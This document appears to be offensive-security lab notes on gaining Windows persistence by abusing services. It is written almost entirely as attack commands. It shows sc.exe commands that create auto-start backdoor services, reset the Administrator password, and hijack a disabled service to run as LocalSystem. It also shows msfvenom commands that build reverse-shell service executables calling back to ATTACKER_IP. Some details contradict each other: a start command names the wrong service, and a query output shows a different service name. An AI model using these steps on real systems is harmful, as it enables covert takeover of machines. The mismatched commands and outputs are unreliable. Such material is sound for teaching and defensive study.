# Abusing Services

* Windows services offer a great way to establish persistence since they can be configured to run in the background whenever the victim machine is started. If we can leverage any service to run something for us, we can regain control of the victim machine each time it is started.
* A service is basically an executable that runs in the background. When configuring a service, you define which executable will be used and select if the service will automatically run when the machine starts or should be manually started.
* There are two main ways we can abuse services to establish persistence: either create a new service or modify an existing one to execute our payload.

### Creating backdoor services

* We can create and start a service named "RestartService" using the following commands:

```
sc.exe create RestartService binPath= "net user Administrator Passwd123" start= auto
sc.exe start RestartService
```

* **Note: There must be a space after each equal sign for the command to work.**
* The "`net user`" command will be executed when the service is started, **resetting the Administrator's password to `Passwd123`**. Notice how the service has been set to start automatically `(start= auto)`, so that it runs without requiring user interaction.
* Resetting a user's password works well enough, but we can also create a reverse shell with `msfvenom` and associate it with the created service.
* Notice, however, that service executables are unique since they need to implement a particular protocol to be handled by the system.
* If you want to create an executable that is compatible with Windows services, you can use the `exe-service` format in msfvenom:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rev-svc.exe
```

* You can then copy the executable to your target system, say in C:\Windows and point the service's binPath to it:

```
sc.exe create RestartService2 binPath= "C:\windows\rev-svc.exe" start= auto
sc.exe start RestartService
```

* This should create a connection back to your attacker's machine.

### Modifying existing services

* While creating new services for persistence works quite well, the blue team may monitor new service creation across the network.
* We may want to reuse an existing service instead of creating one to avoid detection.
* Usually, any disabled service will be a good candidate, as it could be altered without the user noticing it.
* You can get a list of available services using the following command:

```
sc.exe query state=all

SERVICE_NAME: Test
DISPLAY_NAME: Test
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 1077  (0x435)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

* You should be able to find a stopped service called `Test`. To query the service's configuration, you can use the following command:

```
sc.exe qc Test
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: Test
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2 AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\MyService\Test.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Test
        DEPENDENCIES       : 
        SERVICE_START_NAME : NT AUTHORITY\Local Service
```

* There are three things we care about when using a service for persistence:
* The executable (`BINARY_PATH_NAME`) should point to our payload.
* The service `START_TYPE` should be automatic so that the payload runs without user interaction.
* The `SERVICE_START_NAME`, which is the account under which the service will run, should preferably be set to `LocalSystem` to gain `SYSTEM` privileges.
* Let's start by creating a new reverse shell with msfvenom:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=5558 -f exe-service -o rev-svc2.exe
```

To reconfigure "`Test`" parameters, we can use the following command:

```
sc.exe config Test binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"
```

You can then query the service's configuration again to check if all went as expected:

```
sc.exe qc Test
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: THMservice3
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\rev-svc2.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Test
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```
